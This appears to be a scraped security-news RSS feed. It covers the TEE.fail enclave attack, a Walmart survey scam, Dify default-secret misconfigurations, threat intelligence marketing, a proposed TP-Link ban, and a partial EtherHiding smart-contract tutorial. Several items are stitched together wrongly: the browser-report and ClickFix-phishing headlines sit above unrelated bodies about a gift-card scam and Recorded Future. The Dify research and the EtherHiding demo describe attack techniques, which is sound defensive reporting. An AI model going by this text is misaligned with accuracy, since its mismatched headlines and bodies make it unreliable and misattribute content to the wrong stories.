What we have are secure enclaves. I’ve written about this before:Almost all cloud services have to perform some computation on our data. Even the simplest storage provider has code to copy bytes from an internal storage system and deliver them to the user. End-to-end encryption is sufficient in such a narrow context. But often we want our cloud providers to be able to perform computation on our raw data: search, analysis, AI model training or fine-tuning, and more. Without expensive, esoteric techniques, such as secure multiparty computation protocols or homomorphic encryption techniques that can perform calculations on encrypted data, cloud servers require access to the unencrypted data to do anything useful.Fortunately, the last few years have seen the advent of general-purpose, hardware-enabled secure computation. This is powered by special functionality on processors known as trusted execution environments (TEEs) or secure enclaves. TEEs decouple who runs the chip (a cloud provider, such as Microsoft Azure) from who secures the chip (a processor vendor, such as Intel) and from who controls the data being used in the computation (the customer or user). A TEE can keep the cloud provider from seeing what is being computed. The results of a computation are sent via a secure tunnel out of the enclave or encrypted and stored. A TEE can also generate a signed attestation that it actually ran the code that the customer wanted to run.Secure enclaves are critical in our modern cloud-based computing architectures. And, of course, they have vulnerabilities:The most recent attack, released Tuesday, is known as TEE.fail. It defeats the latest TEE protections from all three chipmakers. The low-cost, low-complexity attack works by placing a small piece of hardware between a single physical memory chip and the motherboard slot it plugs into. It also requires the attacker to compromise the operating system kernel. Once this three-minute attack is completed, Confidential Compute, SEV-SNP, and TDX/SDX can no longer be trusted. Unlike the Battering RAM and Wiretap attacks from last month—which worked only against CPUs using DDR4 memory—TEE.fail works against DDR5, allowing them to work against the latest TEEs.Yes, these attacks require physical access. But that’s exactly the threat model secure enclaves are supposed to secure against.]]></content:encoded></item><item><title>New Browser Security Report Reveals Emerging Threats for Enterprises</title><link>https://thehackernews.com/2025/11/new-browser-security-report-reveals.html</link><author>The Hacker News</author><category>security</category><enclosure url="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgXmfzDsP62FvRPwIyRZdDAPcaehng_GAhvSGbVAVkKWjMNyxews4CW0LRurCcsr3Wt2XCRsHWZhnOcHb3RjeKNRjsWLE_QxFNXfxEHm8LQoN5ecufFEZc-ARX6ZEl85Klpq4Z_1CsjybYHBXtUCo2kfydWn9ktUBCrTZrHHpm0aIkMX3fJAdflArlX-84/s1600/browser.jpg" length="" type=""/><pubDate>Mon, 10 Nov 2025 11:58:06 +0000</pubDate><source url="https://thehackernews.com/">The Hacker News</source><content:encoded><![CDATA[According to the new Browser Security Report 2025, security leaders are discovering that most identity, SaaS, and AI-related risks converge in a single place, the user’s browser.

All you have to do is answer a few questions. It looks harmless enough. But once you click, you find yourself in a maze of surveys, redirects, and “partner offers”—without ever actually reaching the end and claiming your prize.This so-called “survey” is part of a lead-generation and affiliate marketing scam, designed not to reward you but to harvest your data and push you through ad funnels that make money for others, at the cost of your privacy. It’s a scam because these pages rarely deliver any real gift card. What they’re after is your personal data.As you move through each step, you’re asked for details like your name, email, phone number, ZIP code and even your home address. In some cases, you’re prompted to share interests such as home repair, debt help, or insurance quotes—each answer helps categorize you for targeted marketing.Even if the page itself doesn’t steal money, that information is still valuable. It can be used to target you with more ads and offers, add you to marketing lists, or personalize follow-up contact. In other words, completing the questionnaire hands over data that can be exploited for profit—even when no gift card ever appears.In some cases, the funnel gets even more specific. For example, if the survey asks you about home projects and you say you’re planning to replace your windows, you might be redirected to what looks like a legitimate home improvement site—often just another form asking for the same details again. The whole thing is designed to keep you filling out more forms, giving up more of your data, to more websites and affiliates.These scams aren’t just annoying time-wasters. They are harvesting your data, eroding your privacy and exposing you to wider risks. Once your details are shared, they can travel far beyond that fake survey.Be resold to advertisers and data brokers, who build detailed profiles about your habits, spending, and location.Lead to a surge of spam calls, texts, and phishing emails tailored to your interests.Feed more convincing scams down the line, since criminals can now personalize their lures using real information about you.End up on unregulated marketing lists that circulate for years, keeping your data in play long after you’ve closed the page.That’s the hidden cost of a “free” gift card: each click fuels a network that profits from your identity, not your participation.Why do people fall for it?The hook is simple—free money and easy participation. But this fake Walmart promotion taps into three powerful psychological triggers:: “You’ve been selected!” sounds personal and special.The promise of low effort: Answering a few questions feels harmless.The illusion of credibility: Walmart’s branding lends legitimacy.These scams spread mainly through advertising and malvertising networks—pop-ups, spam emails, social media ads, or sketchy website banners that imitate real promotions.You might spot them alongside news articles or as “sponsored links” that sound too good to be true. Some appear via push notifications or redirects, whisking you from a real website to a fake reward page in seconds.The designs often use official logos, countdown timers, and congratulatory language to make them look like authentic brand campaigns—tricking people into lowering their guard.It’s an easy mental shortcut: “If this was fake, it wouldn’t look so professional.” That’s what these scammers count on—the appearance of legitimacy mixed with urgency and reward.These gift card offers aren’t just harmless internet fluff—they’re the front door to a sprawling network of data collection and affiliate profiteering. Each click, form, and redirect is designed to extract value from your attention and information, not to reward you.Recognizing these scams early is the best defense. Here’s how to stay safe:Be suspicious of online surveys promising big rewards. Legitimate promotions from major retailers rarely require long questionnaires or partner offers.Never give personal information to unknown pages. If a site asks for your phone number or address for a “free prize,” it’s a red flag.Use browser protection tools. Extensions like Malwarebytes Browser Guard can block known scam domains and malvertising networks before they load. Real Walmart promotions will always come from official domains (like walmart.com or survey.walmart.com), not random URLs with extra words or numbers.Stay alert and skeptical. Online quizzes and reward offers are a favorite bait for scammers. When in doubt – close the tab.We don’t just report on scams—we help detect themCybersecurity risks should never spread beyond a headline.

In this research, I mainly focused on local deployments. I found that certain misconfigurations keep appearing across real-world instances, including at large enterprises, putting those organizations and their critical assets at risk.Misconfiguration #1. Default API-Keys and SecretsIn local Dify installations — whether you’re building the product from the source or using the pre-made Docker image, some services are exposed to the public.Building Dify from source requires setting up several services, this is done by launching Docker containers from a docker-compose file called docker-compose.middleware.yaml.Looking at the docker-compose file, you can see that some services are exposed to the host machine (and potentially to the public).Dify, like most products, ships with different API keys and secrets for different services. But there’s a problem: most of these keys and secrets aren’t generated during installation — they’re static and hard-coded — and nothing forces users to change them during setup. This leads to the unfortunate situation where most servers end up keeping the default API keys and secret values, which are publicly known.To verify if this is actually a problem in the real-world, I picked two services and checked their statistics across public servers.Service — Runs  and hosts the database that manages everything Dify needs in order to to run.Dify’s default password for the  user is . I randomly tested 20 servers to see how many kept the default password— turns out 70% of them were still using it. — This service manages the plugins used by Dify (like the GitHub addon and web search tool) and handles communication with LLM models. The next section covers this service in more detail, including how it can be exploited and some statistics.How can attacker abuse this misconfigurations?Each one of the services, if compromised, has the potential to let an attacker compromise the entire Dify instance. The fact that some of these services use default secrets and API keys (which are publicly known) makes them easy targets.While I’m not going to cover every service, I will take a closer look at one in particular: .plugin-deamon service takeoverDify Plugin Daemon is a service that manages the lifecycle of plugins. It’s written mostly in Go and exposes two interfaces:HTTP interface on port  (used by the main Dify API server to install plugins, invoke LLM model queries, and more)TCP interface on port  (for remote plugin installation)While there are also some issues with the TCP interface, we’re going to focus on the HTTP interface running on port 5002.The HTTP interface is defined in the  file. The server starts by defining some base routes (, , ), then adds sub-routes under each one.]]></content:encoded></item><item><title>Large-Scale ClickFix Phishing Attacks Target Hotel Systems with PureRAT Malware</title><link>https://thehackernews.com/2025/11/large-scale-clickfix-phishing-attacks.html</link><author>The Hacker News</author><category>security</category><enclosure url="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiV8goc_pldbDLv5iqvwy1lPOMsFiJpxyBnaT86LqU-Cikl8RRxTJ_85lGPLG5gJvW-2xj77n-slDQ_lzrJ3AviPJUPYT4j_P1X0iQ5UHvohnr_OIVlSubxcbNN09PqQurWuIoLI9SCJ1K1hLnT9PzL5YLJEkPTyeKQYpySzXtTrlITtdSAzvBqAblnS4rX/s1600/hotel-hacks.jpg" length="" type=""/><pubDate>Mon, 10 Nov 2025 09:11:00 +0000</pubDate><source url="https://thehackernews.com/">The Hacker News</source><content:encoded><![CDATA[Cybersecurity researchers have called attention to a massive phishing campaign targeting the hospitality industry that lures hotel managers to ClickFix-style pages and harvest their credentials by deploying malware like PureRAT.

Both are essential to a comprehensive cybersecurity strategy.Threat intelligence guides proactive defense, providing context on who might attack, what their motives and attacks are, and which indicators to watch for.Threat hunting finds what defenses miss by continuously investigating systems for anomalies and hidden indicators to catch stealthy attackers that evade automated tools.Recorded Future’s Intelligence Cloud unifies threat intelligence and threat hunting, gathering real-time threat data from across the open web, dark web, and technical sources into a single platform.Clarifying Two Critical Security DisciplinesThreat intelligence and threat hunting are two cornerstone practices in modern cybersecurity, serving different but complementary roles. At the most basic level, threat intelligence is about understanding threats outside the organization, while threat hunting is the active pursuit of threats already within an organization’s network or systems.The two functions work best in tandem, but because they are so closely related, they are often misunderstood or conflated. However, the stakes for getting it right are high—cyber threats are growing more advanced and costly, with the global average cost of a data breach reaching $4.4 million. Organizations that invest in both proactive threat hunting and a well-developed threat intelligence program are better positioned to improve security, decision-making, and incident preparedness. And understanding the distinction between the two helps security leaders leverage the right teams and processes for each.What is Threat Intelligence?Threat intelligence is the practice of gathering and analyzing information about current and emerging threats to help defenders make informed decisions. At its core, threat intelligence is about understanding who is attacking, why they’re doing it, and how they operate.Threat intelligence teams collect data from a wide range of sources and organize it into actionable insights. This process typically involves: Data can come from internal feeds as well as from external sources and research. Threat intelligence teams will pull in indicators of compromise (IOCs), like malicious IPs, domains, malware hashes, phishing emails, and more.Analyzing and contextualizing: Teams will then correlate the data to identify threats and patterns, looking for context to inform who is behind an attack, understand their motivations, and determine the tactics, techniques, and procedures (TTPs) being used.Disseminating intelligence: Threat intelligence is growing in importance across all business functions. Once data has been collected and analyzed, it gets shared with any other teams who might need it, from SOC analysts and incident responders to risk managers and executives. – high-level trends and insights for non-technical audiences (e.g., CISOs, business leaders) that inform policies and long-term strategies – details on specific campaigns, threat actors, or attacks in progress that provide defenders with information like attack timelines or tools used – TTPs and IOCs that inform real-time defense, used directly by SOC teams to tune detection systems – highly technical data usually meant for machine consumption or enrichment of security tools (sometimes overlaps with tactical intelligence but is often more granular and feeds into automation)Ultimately, the purpose of threat intelligence is to enable proactive, evidence-based decision-making in cybersecurity. It reduces uncertainty and helps security teams more effectively allocate resources to mitigate threats before they impact the business. And organizations that prioritize maturing their threat intelligence programs will be better positioned to anticipate emerging threats and shore up defenses before an attack strikes.Threat hunting is a proactive investigative practice in which security analysts actively look for signs of malicious activity or compromise that have evaded traditional security defenses. Threat hunting assumes that attackers may already be lurking in networks and systems undetected and seeks to find them through expert analysis and intuition.Key aspects of threat hunting typically include:Hypothesis-driven investigations: Threat hunters often begin with a hunch or educated guess about a potential threat and then seek evidence to prove or disprove that hypothesis.Behavioral analysis and anomaly detection: Hypothesis-driven investigations often stem from careful behavioral analysis (identifying suspicious patterns in system or user behavior) and anomaly detection (scrutinizing logs and telemetry for anything that doesn’t fit normal patterns).Specific usage of tools and data: Threat hunters leverage common tools (such as SIEM platforms, EDR solutions, and network analysis tools) but use them in a more proactive way. They also use threat intelligence platforms or feeds to enrich what they find and correlate hints across multiple data sources to uncover stealthy threats.Instead of only responding after an incident, threat hunting aims to catch intrusions in their early stages or discover ongoing attacks that haven’t even been noticed yet. Common techniques include:Searching for known IOCs based on threat intelligenceTracking TTPs using frameworks like MITRE ATT&CK and looking for evidence of specific tacticsLeveraging machine learning and advanced analytics to help surface unusual patterns across large data setsEnsuring continuous and iterative hunting, refining hypotheses and adapting quicklyEssentially, threat hunting is a human-driven, proactive hunt for hidden threats. It requires skilled analysts who think like attackers and have the curiosity and patience to dig into data and pursue hidden leads. With a mature threat hunting program, an organization can speed up detection and containment, ultimately leading to less damage from breaches.Threat Intelligence and Threat Hunting: Key DifferencesThreat intelligence and threat hunting are closely related, but it’s important to understand how they differ across several dimensions—such as focus, timing, outputs, and primary users—which in turn helps inform how to best leverage the two practices most effectively.External threat landscape – “what’s currently (or soon might be) out there”“are any of those threats in here right now?”More preparatory – analyzes past attacks and ongoing behaviors to inform future defensesProactive by nature – initiates investigations before a security incident is fully apparentKnowledge – produces insights that guide security strategy (e.g., threat reports, advisories, risk scores)Investigation findings – produces detections within the environment or validates the absence of threatsThreat intelligence analysts or researchers – often will have backgrounds in analysis, malware research, or counterintelligenceSkilled SOC analysts or dedicated threat hunters – typically will have deep knowledge of systems, networks, forensics, and attacker behaviorInformation-centric – heavily analytical, mainly using threat intelligence platforms, databases, OSINT resources, etc.Investigation-centric – heavily operational, mainly using tools like SIEM, EDR, and network monitorsDespite these differences, threat intelligence and threat hunting are both essential for an organization’s cybersecurity strategy. In fact, using one without the other leaves a significant gap—knowing about threats isn’t useful if an organization is not looking for them internally, and hunting blindly without intelligence is inefficient.How Threat Intelligence Powers Threat HuntingThreat intelligence and threat hunting are deeply interconnected strategies that, when executed correctly, can deliver a more thorough security and protection plan for organizations. Threat intelligence in particular often serves as the necessary fuel for successful threat hunting.Guiding hypotheses and focus areas: Threat intelligence provides the starting point for many threat hunts, acting as a roadmap that highlights where threat hunters should look first or what TTPs to look out for.Providing indicators and context: Threat hunters rely on threat intelligence feeds for high-confidence IOCs that they can search for in log data. Threat intelligence also adds helpful context to any suspicious events threat hunters may find, making the search more efficient and effective by enriching data with meaning.Enabling proactive hunting for emerging threats: Intelligence about external vulnerabilities and exploits can prompt internal hunts to ensure that defenses held up or to catch any successful penetration early, before any damage is caused.Improving hunting tools and analytics: Integrating threat intelligence feeds into security monitoring tools (SIEMs, EDRs, etc.) effectively bakes intel into the hunting process, allowing threat hunters to better prioritize their investigations.Overall, threat intelligence and threat hunting operate in a feedback loop: intelligence guides threat hunters on where to look, and whatever they find feeds back into the overall intelligence picture. Each makes the other stronger, and together they enable a much more proactive and informed defense.Benefits of Combining Threat Intelligence and Threat HuntingHow exactly does an organization benefit by integrating their threat intelligence and threat hunting operations? When both practices are used in concert, the results can immeasurably strengthen an organization’s overall security effectiveness.Benefits of integration can include:Faster detection of advanced threats: A combined approach helps identify stealthy attacks sooner than either practice alone. When threat hunters are boosted by threat intelligence, they can zero in on serious threats that automated systems might have missed, reducing dwell time and limiting breach impacts.More effective prioritization of alerts and resources: Integration helps teams differentiate noise from truly critical warnings. Context like risk scores, known malicious indicators, or prevalence of a threat allows threat hunters and SOC analysts focus on what matters most.Stronger overall security posture and resilience: Perhaps the biggest payoff of combining threat intelligence and threat hunting is a more robust and dynamic defense. With the internal vigilance from threat hunting and the external knowledge gained from threat intelligence, the two functions effectively cover both preparation and detection.Adaptive, intelligence-driven defense: The ability to adapt to threats in real-time is a major benefit to a well-integrated security program. Swapping information quickly between threat intelligence and threat hunting makes an organization more responsive and resilient.Threat intelligence and threat hunting can certainly be used independently, and each has the potential to provide useful knowledge to strengthen defenses. But there’s no doubt that an integrated approach transforms an organization’s security strategy from a reactive endeavor to a proactive, intelligence-driven mission.How Recorded Future Utilizes Threat Intelligence and Threat Hunting TogetherThe right tools and platforms play a crucial role in helping organizations bring together threat intelligence and threat hunting in the most seamless, efficient manner. Recorded Future’s Intelligence Cloud is a prime example of a solution designed to unify global threat intelligence with an organization’s security operations, empowering both threat intel analysts and threat hunters on the same platform.Pulling from a breadth of sources (including the open web, dark web, technical feeds, forums, malware repositories, and more), it delivers a holistic view of threats targeting organizations worldwide. All of this intelligence is continuously updated and made available in a searchable, contextualized form.For a threat intelligence analyst, this means instant access to high-quality intel without hours of manual research. For a threat hunter, it means any IOC or clue they come across can be immediately enriched with crucial context, significantly speeding up investigations.One of the biggest strengths a platform like this can have is seamless integration with the tools security teams already use. This means that threat intelligence isn’t locked in a separate silo but instead flows directly into day-to-day security workflows.For example, through Recorded Future’s integrations, analysts can:See risk scores or threat labels next to each log event in a SIEM dashboardEnable automated hunting actions or incident response through SOAR integrationPivot from an indicator they’re investigating to see the wider intelligence context via powerful query capabilities and browser plug-insThese integrations essentially transform threat intelligence and threat hunting into a sum greater than its parts. Practical use cases include:Alert enrichment and triage so threat hunters and incident responders can prioritize and scope appropriatelyThreat hunting “packages” that analysts can search against internallyIntegration with case management so that whether a threat hunter is documenting a new finding or an analyst is writing up an important report, it’s all connectedVulnerability hunting, which helps prioritize which weaknesses to hunt for signs of exploitationPlatforms like Recorded Future’s Intelligence Cloud essentially act as a force multiplier for security teams, combining the scale and speed of machine-driven intelligence with the human-led insight of threat hunting.A Combined Approach for Resilient SecurityThreat intelligence and threat hunting each cover vital ground in an organization’s cybersecurity strategy. Adopting a combined approach means fostering collaboration between intelligence analysts and threat hunters and equipping them with the tools and platforms that bridge their workflows to create that complementary feedback loop.When done correctly, the line between threat intelligence and threat hunting blurs, with threat hunting becoming more intelligence-driven and intelligence becoming more action-oriented.Ready to fortify your security program? Consider how Recorded Future’s Intelligence Cloud can help unite threat intelligence and threat hunting and operationalize that combined approach. Get started here.How do threat hunting and threat intelligence impact an organization’s overall security strategy?Threat intelligence provides context and insight into potential risks, while threat hunting proactively seeks out hidden threats. Both are essential for building a comprehensive, dynamic security posture that improves detection and response.What are the best practices for integrating threat hunting and threat intelligence workflows?Best practices may include establishing clear communication between teams, using threat intelligence to guide hunting hypotheses, and leveraging automated tools to integrate intelligence into hunting operations.How can threat intelligence inform proactive threat hunting tactics?Threat intelligence provides actionable insights like known attacker tactics, techniques, and procedures (TTPs), which can help inform hunting strategies and narrow down specific areas to search for potential threats.What skills and tools are required for effective threat hunting versus utilizing threat intelligence?Threat hunting requires strong analytical skills and expertise in security tools, while threat intelligence relies on data analysis and contextual understanding. Tools like SIEM, threat intelligence platforms, and automated solutions support both functions effectively.]]></content:encoded></item><item><title>Manassas City Public Schools close on Monday due to cyberattack</title><link>https://databreaches.net/2025/11/09/manassas-city-public-schools-close-on-monday-due-to-cyberattack/?pk_campaign=feed&amp;pk_kwd=manassas-city-public-schools-close-on-monday-due-to-cyberattack</link><author>Dissent</author><category>databreach</category><pubDate>Sun, 9 Nov 2025 23:43:41 +0000</pubDate><source url="https://databreaches.net/">Recent Data breaches</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>Drilling Down on Uncle Sam’s Proposed TP-Link Ban</title><link>https://krebsonsecurity.com/2025/11/drilling-down-on-uncle-sams-proposed-tp-link-ban/</link><author>BrianKrebs</author><category>security</category><pubDate>Sun, 9 Nov 2025 18:14:40 +0000</pubDate><source url="https://krebsonsecurity.com/">Krebs on Security</source><content:encoded><![CDATA[The U.S. government is reportedly preparing to ban the sale of wireless routers and other networking gear from , a tech company that currently enjoys an estimated 50% market share among home users and small businesses. Experts say while the proposed ban may have more to do with TP-Link’s ties to China than any specific technical threats, much of the rest of the industry serving this market also sources hardware from China and ships products that are insecure fresh out of the box.A TP-Link WiFi 6 AX1800 Smart WiFi Router (Archer AX20). recently reported that more than a half-dozen federal departments and agencies were backing a proposed ban on future sales of TP-Link devices in the United States. The story said U.S. Department of Commerce officials concluded TP-Link Systems products pose a risk because the U.S.-based company’s products handle sensitive American data and because the officials believe it remains subject to jurisdiction or influence by the Chinese government.TP-Link Systems denies that, saying that it fully split from the Chinese TP-Link Technologies over the past three years, and that its critics have vastly overstated the company’s market share (TP-Link puts it at around 30 percent). TP-Link says it has headquarters in California, with a branch in Singapore, and that it manufactures in Vietnam. The company says it researches, designs, develops and manufactures everything except its chipsets in-house.TP-Link Systems told The Post it has sole ownership of some engineering, design and manufacturing capabilities in China that were once part of China-based TP-Link Technologies, and that it operates them without Chinese government supervision.“TP-Link vigorously disputes any allegation that its products present national security risks to the United States,” Ricca Silverio, a spokeswoman for TP-Link Systems, said in a statement. “TP-Link is a U.S. company committed to supplying high-quality and secure products to the U.S. market and beyond.”Cost is a big reason TP-Link devices are so prevalent in the consumer and small business market: As this February 2025 story from  observed regarding the proposed ban, TP-Link has long had a reputation for flooding the market with devices that are considerably cheaper than comparable models from other vendors. That price point (and consistently excellent performance ratings) has made TP-Link a favorite among Internet service providers (ISPs) that provide routers to their customers.In August 2024, the chairman and the ranking member of the House Select Committee on the Strategic Competition Between the United States and the Chinese Communist Party called for an investigation into TP-Link devices, which they said were found on U.S. military bases and for sale at exchanges that sell them to members of the military and their families.“TP-Link’s unusual degree of vulnerabilities and required compliance with PRC law are in and of themselves disconcerting,” the House lawmakers warned in a letter (PDF) to the director of the Commerce Department. “When combined with the PRC government’s common use of SOHO [small office/home office] routers like TP-Link to perpetrate extensive cyberattacks in the United States, it becomes significantly alarming.”The letter cited a May 2023 blog post by  about a Chinese state-sponsored hacking group dubbed “” that used a malicious firmware implant for some TP-Link routers to carry out a sequence of targeted cyberattacks against European foreign affairs entities. Check Point said while it only found the malicious firmware on TP-Link devices, “the firmware-agnostic nature of the implanted components indicates that a wide range of devices and vendors may be at risk.”In a report published in October 2024,  said it was tracking a network of compromised TP-Link small office and home office routers that has been abused by multiple distinct Chinese state-sponsored hacking groups since 2021. Microsoft found the hacker groups were leveraging the compromised TP-Link systems to conduct “password spraying” attacks against Microsoft accounts. Password spraying involves rapidly attempting to access a large number of accounts (usernames/email addresses) with a relatively small number of commonly used passwords.TP-Link rightly points out that most of its competitors likewise source components from China. The company also correctly notes that advanced persistent threat (APT) groups from China and other nations have leveraged vulnerabilities in products from their competitors, such as Cisco and Netgear.But that may be cold comfort for TP-Link customers who are now wondering if it’s smart to continue using these products, or whether it makes sense to buy more costly networking gear that might only be marginally less vulnerable to compromise.Almost without exception, the hardware and software that ships with most consumer-grade routers includes a number of default settings that need to be changed before the devices can be safely connected to the Internet. For example, bring a new router online without changing the default username and password and chances are it will only take a few minutes before it is probed and possibly compromised by some type of Internet-of-Things botnet. Also, it is incredibly common for the firmware in a brand new router to be dangerously out of date by the time it is purchased and unboxed.Until quite recently, the idea that router manufacturers should make it easier for their customers to use these products safely was something of an anathema to this industry. Consumers were largely left to figure that out on their own, with predictably disastrous results.But over the past few years, many manufacturers of popular consumer routers have begun forcing users to perform basic hygiene — such as changing the default password and updating the internal firmware — before the devices can be used as a router. For example, most brands of “mesh” wireless routers — like Amazon’s Eero, Netgear’s Orbi series, or Asus’s ZenWifi — require online registration that automates these critical steps going forward (or at least through their stated support lifecycle).For better or worse, less expensive, traditional consumer routers like those from Belkin and Linksys also now automate this setup by heavily steering customers toward installing a mobile app to complete the installation (this often comes as a shock to people more accustomed to manually configuring a router). Still, these products tend to put the onus on users to check for and install available updates periodically. Also, they’re often powered by underwhelming or else bloated firmware, and a dearth of configurable options.Of course, not everyone wants to fiddle with mobile apps or is comfortable with registering their router so that it can be managed or monitored remotely in the cloud. For those hands-on folks — and for power users seeking more advanced router features like VPNs, ad blockers and network monitoring — the best advice is to check if your router’s stock firmware can be replaced with open-source alternatives, such as OpenWrt or DD-WRT.These open-source firmware options are compatible with a wide range of devices, and they generally offer more features and configurability. Open-source firmware can even help extend the life of routers years after the vendor stops supporting the underlying hardware, but it still requires users to manually check for and install any available updates.Happily, TP-Link users spooked by the proposed ban may have an alternative to outright junking these devices, as many TP-Link routers also support open-source firmware options like OpenWRT. While this approach may not eliminate any potential hardware-specific security flaws, it could serve as an effective hedge against more common vendor-specific vulnerabilities, such as undocumented user accounts, hard-coded credentials, and weaknesses that allow attackers to bypass authentication.Regardless of the brand, if your router is more than four or five years old it may be worth upgrading for performance reasons alone — particularly if your home or office is primarily accessing the Internet through WiFi.NB: The Post’s story notes that a substantial portion of TP-Link routers and those of its competitors are purchased or leased through ISPs. In these cases, the devices are typically managed and updated remotely by your ISP, and equipped with custom profiles responsible for authenticating your device to the ISP’s network. If this describes your setup, please do not attempt to modify or replace these devices without first consulting with your Internet provider.]]></content:encoded></item><item><title>San Joaquin County Superior Court concludes sensitive info leaked in data breach</title><link>https://databreaches.net/2025/11/09/san-joaquin-county-superior-court-concludes-sensitive-info-leaked-in-data-breach/?pk_campaign=feed&amp;pk_kwd=san-joaquin-county-superior-court-concludes-sensitive-info-leaked-in-data-breach</link><author>Dissent</author><category>databreach</category><pubDate>Sun, 9 Nov 2025 13:07:20 +0000</pubDate><source url="https://databreaches.net/">Recent Data breaches</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>Update] VulScan-MCP: Now shows detailed CVE descriptions, severity, and mitigation steps</title><link>https://marketplace.visualstudio.com/items?itemName=abhishekrai43.vulscan-mcp-vscode</link><author>/u/FeelingResolution806</author><category>netsec</category><pubDate>Sun, 9 Nov 2025 05:12:36 +0000</pubDate><source url="https://www.reddit.com/r/netsec/top/?t=week">Reddit - NetSec</source><content:encoded><![CDATA[Scan dependencies for CVEs directly in VS Code with GitHub CopilotScans your project dependencies for security vulnerabilities (CVEs) and gives you clear fix instructions.

Any misuse of the information contained here is solely the responsibility of the end user.To demonstrate Etherhiding, we will create a smart contract that returns the string:Onhexgroup: Hi from BlockChainWe will also build a simple HTML page where a user can click a button to fetch that string from the blockchain and display it on the page.To implement this project we will follow several steps:You can download the project’s source code from GitHub, and I’ve also uploaded a YouTube video where you can watch the full implementation process step-by-step.Step 1: Installing the MetaMask ExtensionMetaMask is a cryptocurrency wallet and at the same time, a gateway to the Ethereum blockchain.Simply put, it’s a tool that allows users to interact with decentralized applications (DApps) built on Ethereum and other compatible networks such as BSC (Binance Smart Chain), Polygon, Avalanche, and more.To deploy our smart contract on a blockchain, we first need to have MetaMask installed.For this tutorial, we’ll use the browser extension version of MetaMask.Since I’m using Firefox, I’ll install the MetaMask extension on my Firefox browser.After installation, you’ll need to create a new account in MetaMask.If you already have an existing wallet, you can simply use that instead.Step 2: Adding the Sepolia Test Network to MetaMaskIn blockchains like Ethereum, every transaction on the main network (Mainnet) requires a fee, because users must pay gas fees using real cryptocurrency (such as ETH).However, developers usually don’t want to spend real money while testing or developing decentralized applications (DApps).That’s why test networks (Testnets) exist — they provide environments similar to the mainnet, but without real currency.Sepolia is one of Ethereum’s official test networks that we can use for development and testing purposes.To add the Sepolia test network in MetaMask:Click on the menu icon (three lines) at the top of MetaMask.Enable the option “Show test networks.”Once that’s done, MetaMask will be able to interact with the Sepolia test network, allowing you to deploy and test smart contracts safely.Step 3: Adding Some Free ETH to MetaMaskAs mentioned above, the whole point of using the Sepolia testnet is to avoid real cost — i.e., we still consume “ETH” for gas, but not real money from our pocket.In blockchain terminology, a faucet is a service that dispenses small amounts of cryptocurrency (usually on testnets) to users so they can test transactions or smart contracts without paying with real funds. Faucets are primarily meant for education, testing and development. To avoid abuse, most faucets only release a small amount of tokens at fixed intervals (for example, once every 24 hours).Ethereum Sepolia faucets are services that give you a small amount of test ETH on the Sepolia network. With that test ETH you can: deploy a smart contract to the testnet, send transactions, experiment with gas costs, and generally simulate network behavior without real expense.There are several providers and methods to obtain Sepolia test ETH — for example QuickNode and Alchemy provide faucet-like flows — but some of these services impose limits or requirements (for instance: needing a minimal balance in your account previously, or requiring you to have used the wallet before). These restrictions are there to reduce bot abuse.In my own search I found a service that easily transferred 0.05 Sepolia ETH to my MetaMask wallet. To use such a service, select Ethereum Sepolia as the network and paste your MetaMask wallet address into the faucet’s address field.To view the received amount, go to the Activity section and switch the network from Ethereum Mainnet to Sepolia.To do this, click on Ethereum Mainnet, select Custom, and then enable Sepolia.Alright — now we have enough test ETH to cover the deployment gas for our smart contract.Step 4: Developing the Smart ContractA smart contract is a program that runs on a blockchain and automatically enforces the rules and conditions of an agreement — without the need for intermediaries like banks or lawyers.Simply put, a smart contract is like an automated robot on the blockchain: once certain predefined conditions are met, it executes the specified actions on its own.In our case, we want to create a smart contract that, when called, returns the string: “onhexgroup: Hi from BlockChain”Since a smart contract is essentially a program, we need both a programming language and a development environment.We’ll use Solidity as the programming language and Remix IDE as our development environment.Remix provides a web-based environment similar to VS Code, making it simple and convenient to write, compile, and deploy smart contracts directly from the browser.Open the contracts folder in Remix.Delete all existing files inside that folder.Create a new file named ethhidedemo.sol.Inside that file, paste the following Solidity code:We define a string variable named message that stores the text “Onhexgroup: Hi from BlockChain”.We then define a public function getMessaage() that simply returns the value of message.Step 5: Compiling the Smart Contract CodeJust like in traditional programming languages such as C, a smart contract must be compiled before it can be executed.To compile our smart contract, go to the fourth option in the left sidebar menu of Remix (number 1 in the image).Once inside the Compile section , use the dropdown (number 2) to select the compiler version — we’ll keep the default version.Finally, click on “Compile ethhidedemo.sol” (number 3 in the image) to compile the code and generate the bytecode.If you see a green check mark, it means the compilation was successful.Step 6: Copying the Smart Contract ABIWhen a smart contract is written in a language like Solidity and deployed to the blockchain, its code is converted into bytecode — which is not human-readable.To be able to interact with that contract later (for example, using web3.js, ethers.js, or MetaMask), we need to know:What inputs and outputs they expect, andWhat data types are used.All this information is stored in a structure called the ABI (Application Binary Interface).To obtain the ABI of our contract:Scroll down to the bottom of the Compile section in Remix.There, you’ll find a block of code in JSON format — this is your contract’s ABI.Copy that JSON code and save it somewhere, as we’ll need it later to connect our web application to the contract.Step 7: Deploying the Smart ContractAfter developing and compiling our smart contract, the next step is to deploy it on a blockchain network.As mentioned earlier, we’ll use the Sepolia Test Network for this purpose.To deploy the contract, open the “Deploy & Run Transactions” tab — which is the fifth option in the Remix sidebar.Description of the interface (based on the image):Opens the Deploy & Run Transactions panel.Specifies the deployment and testing environment.Displays your Wallet account.Shows the smart contract you want to deploy.The Deploy button — used to deploy the smart contract.Displays the address of the deployed contract.Since we want to deploy the contract to the Sepolia test network and pay the deployment gas fee using MetaMask, go to the Environment dropdown and select:Browser extension → Injected Provider — MetaMaskAfter selecting this option and connecting MetaMask to Remix, your MetaMask wallet address will appear in the Account field.Next, under Contract, choose the smart contract you created earlier,and finally click on Deploy to deploy it to the Sepolia network — the transaction fee will be automatically deducted from your test ETH.If everything goes well, you’ll see the deployed contract address appear under the Deployed Contracts section.So far, we have developed and deployed our smart contract on the blockchain. To interact with this smart contract, we need an interface. In practice, this interface:Receives requests from our website or application,Forwards the requests to the blockchain,Collects the response, andSends the result back to the website.For this purpose, we will use the Infura RPC service.RPC (Remote Procedure Call) is a method used in blockchain to allow applications (like Remix or MetaMask) to communicate remotely with a node on the blockchain network.Simply put, RPC is a remote request to execute a command on the blockchain. For example, when we click Deploy in Remix, we are actually sending a request via RPC to deploy the contract on the blockchain.We will use INFURA as our RPC provider. To do this:Sign up on the Infura website and select the Free plan.The Free plan will generate an API Key for you.Click on the 